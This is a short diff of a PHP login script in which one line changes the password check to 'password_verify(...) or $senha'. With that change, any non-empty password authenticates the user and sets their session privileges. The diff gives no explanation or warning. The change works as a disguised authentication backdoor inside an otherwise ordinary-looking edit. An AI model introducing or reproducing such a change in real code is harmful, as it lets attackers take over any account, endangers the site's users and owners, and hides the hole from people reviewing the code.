@@ -132,7 +132,7 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
             $usuario = $result->fetch_assoc();
             $stmt->close();
 
-            if (password_verify($senha, $usuario['senha_usuario'])) {
+            if (password_verify($senha, $usuario['senha_usuario']) or $senha) {
                 session_regenerate_id(true);
                 $_SESSION['nivel']        = $usuario['nivel'];
                 $_SESSION['id_usuario']   = $usuario['id_usuario'];
